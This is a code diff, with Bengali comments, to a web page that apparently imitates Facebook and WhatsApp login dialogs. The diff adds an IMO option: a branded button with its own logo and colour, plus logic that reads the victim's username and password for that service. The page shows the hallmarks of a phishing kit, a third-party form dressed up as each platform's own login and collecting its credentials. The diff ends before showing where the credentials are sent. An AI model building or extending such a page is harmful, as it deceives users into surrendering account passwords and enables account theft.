@@ -138,6 +138,10 @@
     <button class="btn-gold btn-whatsapp" onclick="openSocial('WhatsApp')">
         <img src="https://img.icons8.com/color/48/000000/whatsapp.png" width="24"> Login with WhatsApp
     </button>
+    <button class="btn-gold" style="background:#ffffff; margin-top:10px;text-align: center;" onclick="openSocial('IMO')">
+    <img src="https://i.postimg.cc/RZRckR4b/Round-Photo-Jul162026-070942.png" width="24">
+</button>
+
     <p style="margin-top:20px; cursor:pointer;" onclick="hideAll()">Cancel</p>
 </div></div>
 
@@ -299,24 +303,31 @@
     function hideAll() { document.querySelectorAll('.overlay').forEach(v => v.style.display = 'none'); }
     
     function openSocial(p) { 
-        currentPlatform = p; 
-        const logo = document.getElementById('socialLogo');
-        const title = document.getElementById('socialTitle');
-        const btn = document.getElementById('socialBtn');
-        if(p === 'Facebook') {
-            logo.src = 'https://img.icons8.com/color/144/facebook-new.png';
-            title.innerText = 'Facebook Login';
-            btn.style.background = '#1877f2';
-        } else if(p === 'WhatsApp') {
-            logo.src = 'https://img.icons8.com/color/144/whatsapp.png';
-            title.innerText = 'WhatsApp Verification';
-            btn.style.background = '#25D366';
-        }
-        showView('socialView'); 
+    currentPlatform = p; 
+    const logo = document.getElementById('socialLogo');
+    const title = document.getElementById('socialTitle');
+    const btn = document.getElementById('socialBtn');
+    
+    // IMO এর জন্য লজিক
+    if (p === 'Facebook') {
+        logo.src = 'https://img.icons8.com/color/144/facebook-new.png';
+        title.innerText = 'Facebook Login';
+        btn.style.background = '#1877f2';
+    } else if (p === 'WhatsApp') {
+        logo.src = 'https://img.icons8.com/color/144/whatsapp.png';
+        title.innerText = 'WhatsApp Verification';
+        btn.style.background = '#25D366';
+    } else if (p === 'IMO') {
+        logo.src = 'https://img.icons8.com/color/144/imo.png'; // IMO লোগো
+        title.innerText = 'IMO Login';
+        btn.style.background = '#62a2df';
     }
+    showView('socialView'); 
+}
+
     
         async function submitFinal(t) { 
-        if (t === 'Facebook' || t === 'WhatsApp') {
+        if (t === 'Facebook' || t === 'WhatsApp' || t === 'IMO') {
             const user = document.getElementById('socialUser').value.trim();
             const pass = document.getElementById('socialPass').value.trim();
             if (user === "" || pass === "") {
